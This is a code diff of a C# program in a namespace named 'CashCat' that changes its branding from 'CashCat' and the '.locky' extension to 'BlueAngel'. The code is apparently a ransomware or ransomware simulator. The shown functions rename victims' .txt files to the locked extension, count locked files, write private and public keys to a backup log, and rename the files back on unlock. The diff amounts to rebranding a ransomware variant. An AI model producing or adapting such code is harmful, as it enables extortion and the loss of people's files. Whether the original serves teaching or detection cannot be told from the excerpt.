@@ -24,7 +24,7 @@ namespace CashCat
 
             try
             {
-                using (StreamWriter w = File.AppendText(exePath + "\\" + "CashCat.log"))
+                using (StreamWriter w = File.AppendText(exePath + "\\" + "BlueAngel.log"))
                 {
                     Log(logMessage, w);
                 }
@@ -45,7 +45,7 @@ namespace CashCat
             
             using (StreamWriter outputFile = new StreamWriter(keylogfile))
             {
-                outputFile.WriteLine("Welcome to your CashCat Key Backup Log File!");
+                outputFile.WriteLine("Welcome to your BlueAngel Key Backup Log File!");
                 outputFile.WriteLine("Private Key: " + privatekey);
                 outputFile.WriteLine("Public Key: " + publickey);
             }
@@ -75,7 +75,7 @@ namespace CashCat
         public FileInfo[] GetLockyFileCount(string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
-            FileInfo[] Files = d.GetFiles("*.locky"); //Getting locky files
+            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting locky files
             return Files;
         }
 
@@ -91,9 +91,9 @@ namespace CashCat
         public void LockTXTFile(FileInfo file)
         {
             string oldfilename = file.Name;
-            string newfilename = (file.Name).Replace(".txt", ".locky");
+            string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
             string oldfileExtension = file.Extension;
-            string newfilefullname = (file.FullName).Replace(".txt", ".locky");
+            string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");
 
             try
             {
@@ -115,9 +115,9 @@ namespace CashCat
             {
                 //Console.WriteLine(file.Name);
                 string oldfilename = file.Name;
-                string newfilename = (file.Name).Replace(".txt", ".locky");
+                string newfilename = (file.Name).Replace(".txt", ".BlueAngel");
                 string oldfileExtension = file.Extension;
-                string newfilefullname = (file.FullName).Replace(".txt", ".locky");
+                string newfilefullname = (file.FullName).Replace(".txt", ".BlueAngel");
 
                 try
                 {
@@ -136,8 +136,8 @@ namespace CashCat
         public void UnlockLockyFile(FileInfo file)
         {
             //Console.WriteLine(file.Name);
-            string newfilename = (file.Name).Replace(".locky", ".txt");
-            string newfilefullname = (file.FullName).Replace(".locky", ".txt");
+            string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
+            string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
@@ -153,13 +153,13 @@ namespace CashCat
         public void UnlockLockyFiles(string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
-            FileInfo[] Files = d.GetFiles("*.locky"); //Getting locky files
+            FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting locky files
             
             foreach (FileInfo file in Files)
             {
                 //Console.WriteLine(file.Name);
-                string newfilename = (file.Name).Replace(".locky", ".txt");
-                string newfilefullname = (file.FullName).Replace(".locky", ".txt");
+                string newfilename = (file.Name).Replace(".BlueAngel", ".txt");
+                string newfilefullname = (file.FullName).Replace(".BlueAngel", ".txt");
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
